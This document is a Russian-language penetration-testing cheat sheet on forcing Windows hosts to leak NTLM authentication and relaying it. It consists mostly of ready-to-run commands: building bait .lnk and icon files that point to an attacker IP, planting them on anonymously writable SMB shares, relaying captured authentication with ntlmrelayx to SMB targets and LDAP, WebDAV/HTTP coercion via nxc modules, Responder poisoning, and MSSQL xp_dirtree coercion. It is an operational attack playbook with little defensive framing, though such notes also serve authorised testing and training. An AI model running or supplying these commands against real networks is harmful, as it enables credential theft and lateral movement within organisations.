#coerce #ntlm #windows #ad #attack #relay 

Когда пользователь заходит в любую сетевую папку, система автоматически отображает значки файлов. Эту функциональность можно проэксплуатировать заменим UNC путь файла на наш адрес `\\172.16.117.30\fake.ico`

Когда пользователь зайдет в папку с подготовленным файлом `.lnk` (его даже не нужно открывать, достаточно увидеть), тол машина выполнит аутентификацию к нам на хост, где мы ее и перехватим

# **SMB Аутентификация**
# 1) ntlmrelayx + ntlm_theft
## Создание файла приманки

**ntlm_theft.py**
```bash
python3 ntlm_theft -g all -s <ATTACKER_IP> -f '@FILE_NAME' # -g все типы файлов
```

## Закладка файла

1) Обнаружение файлов с шарами на запись и чтение (READ, WRITE) 
```bash
nxc smb 172.16.117.0/24 -u anonymous -p '' --shares
```

2) Закладка в шару
```bash
smbclient.py anonymous@172.16.117.3 -no-pass

# shares ADMIN$ C$ CertEnroll IPC$ NETLOGON smb SYSVOL 
# use smb 
# put @myfile/@myfile.lnk 
# exit
```

3) Дожидаемся аутентификации 
```bash
python3 ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

# cat relayTargets.txt
# all://172.16.117.50 
# all://172.16.117.60
```

# 2) nxc

Можем одной командой создать и положить
```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=<ATTACKER_IP> NAME=<FILE_NAME>
```

---

# **HTTP Аутентификация**

## Использование WebDAV

WebDAV использует службу WebClient 
Она может отсутствовать а может быть выключена
Способы запуска службы [здесь](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient)

Обнаружение служб
```bash
nxc smb 172.16.117.0/24 -u 'user' -p 'pass' -M webdav
```

Создание файла приманки и включение службы
```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M drop-sc -o URL=https://172.16.117.30/testing SHARE=smb FILENAME=@secret
```

Заставляем клиента проходить **HTTP аутентификацию**
```bash
nxc smb 172.16.117.3 -u anonymous -p '' -M slinky -o SERVER=NOAREALNAME@8008 NAME=important
```

Отравляем ответы
```bash
sudo python3 Responder.py -I ens192
```

Запуск на нужном порту, с отключенным smb сервером
```bash
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump
```


# **MSSQL Аутентификация**

В аутентифицированной сессий mssql клиента 
Выполняем команду для просмотра директории на другом хосте
```bash
exec xp_dirtree '\\172.16.117.30\Support'
```

Включаем сервер для приема аутентификации
```bash
sudo smbserver.py share Support -smb2support
```